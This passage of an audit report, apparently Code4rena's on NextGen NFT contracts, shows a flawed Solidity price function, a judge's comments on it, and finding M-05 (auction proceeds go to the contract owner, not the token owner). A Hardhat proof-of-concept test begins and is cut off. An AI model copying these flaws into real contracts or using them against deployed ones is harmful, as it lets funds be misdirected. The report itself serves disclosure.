class=\"mtk12\">timestamp</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\"> &amp;&amp; ++ </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicEndTime</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//@audit If Exponential Descending Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">2</span><span class=\"mtk1\">))) / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">) * ((</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//@audit If Linear Descending Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (((</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// fixed price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"assessed-type-6\" style=\"position:relative;\"><a href=\"#assessed-type-6\" aria-label=\"assessed type 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Invalid Validation</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391#issuecomment-1824565193\">a2rocket (NextGen) confirmed via duplicate issue #1391</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275#issuecomment-1841640782\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden specifies an inconsistency within the code whereby the price calculation function will misbehave when measured for a sale type of <code>2</code> combined with the <code>block.timestamp</code> being the <code>publicEndTime</code> of the collectionâ€™s sale period.</p>\n<p>The finding is correct given that the relevant mint functions in the <code>MinterContract</code> perform an inclusive evaluation for both the <code>allowlistStartTime</code> and the <code>publicEndTime</code>, permitting this vulnerability to manifest when the <code>block.timestamp</code> is exactly equal to the <code>publicEndTime</code>.</p>\n<p>The Sponsor has confirmed this in <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391\">#1391</a> and I accept the medium severity classification based on the submissionâ€™s likelihood being low (due to the strict <code>block.timestamp</code> requirement), but the impact being high as an NFT would either be bought at a discount an arbitrary number of times, hurting the artist, or at a high markup, hurting the buyer.</p>\n<p>The Wardenâ€™s submission was selected as the best due to the presence of a PoC with logs that properly emphasize how the issue can be exacerbated depending on the configuration of a sale and its recommended mitigation being sufficient in rectifying the vulnerability.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-auction-payout-goes-to-auctiondemo-contract-owner-not-the-token-owner\" style=\"position:relative;\"><a href=\"#m-05-auction-payout-goes-to-auctiondemo-contract-owner-not-the-token-owner\" aria-label=\"m 05 auction payout goes to auctiondemo contract owner not the token owner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/971\">[M-05] Auction payout goes to <code>AuctionDemo</code> contract owner, not the token owner</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/971\">bird-flu</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1986\">SovaSlava</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1893\">devival</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1884\">0xAadi</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1557\">smiling_heretic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1218\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1127\">Audinarey</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1098\">Viktor_Cortess</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1019\">Eigenvectors</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1010\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/864\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/828\">cartlex_</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/795\">00decree</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/738\">The_Kakers</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/633\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/517\">jacopod</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/493\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/432\">Hama</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/422\">funkornaut</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/321\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/320\">Fitro</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/245\">AS</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/213\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/152\">evmboi32</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/857\">xiao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/313\">REKCAH</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/290\">openwide</a></em></p>\n<p>At the end of an auction in <code>AuctionDemo</code>, the highest bidder claims the token, which transfers the token from the token owner to the auction winner. In the same transaction, the token owner should receive the auction payout.</p>\n<p>However, the function <code>AuctionDemo::claimAuction()</code> sends the payout to the <code>AuctionDemo</code> contract owner.</p>\n<p>This behavior deviates from the listed <a href=\"https://github.com/code-423n4/2023-10-nextgen/tree/main?tab=readme-ov-file#main-invariants\">invariant</a>:</p>\n<blockquote>\n<p>The highest bidder will receive the token after an auction finishes, the owner of the token will receive the funds and all other participants will get refunded.</p>\n</blockquote>\n<ol>\n<li>Auction is started, Alice deployed the <code>AuctionDemo</code> contract and Cecilia approved the <code>AuctionDemo</code> contract to transfer her tokens to the winning bidder.</li>\n<li>Auction is completed. The highest bid was Bob.</li>\n<li>Bob claims his winnings. The token is transferred from Cecilia to Bob. The bid from Bob is sent to Alice and Cecilia gets nothing.</li>\n</ol>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any auction executed through <code>AuctionDemo</code> will have proceeds sent to the <code>AuctionDemo</code> contract owner, not the token owner. The token owner is left without auction proceeds.</p>\n<h3 id=\"poc-2\" style=\"position:relative;\"><a href=\"#poc-2\" aria-label=\"poc 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PoC</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">context</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Auction Sends proceeds to owner of auctiondemo, not the token owner&quot;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">it</span><span class=\"mtk1\">.</span><span class=\"mtk11\">only</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;should execute&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenOwner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nextGenOwner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">highestBidder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Auction contract and collections Setup</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AuctionDemo</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractFactory</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;auctionDemo&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionDemo</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AuctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhAdmin</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> = (</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlock</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlockNumber</span><span class=\"mtk1\">())).</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addMinterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createCollection</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Test Collection 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;Artist 1&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;For testing&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;www.test.com&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;CCO&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;https://ipfs.io/ipfs/hash/&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        [</span><span class=\"mtk8\">&quot;desc&quot;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addRandomizer</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhRandomizer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhCore</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setCollectionData</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">200</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">250</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionCosts</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;.1&#39;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">parseEther</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;.1&#39;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">hhMinter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setCollectionPhases</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">25</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">50</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">150</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span 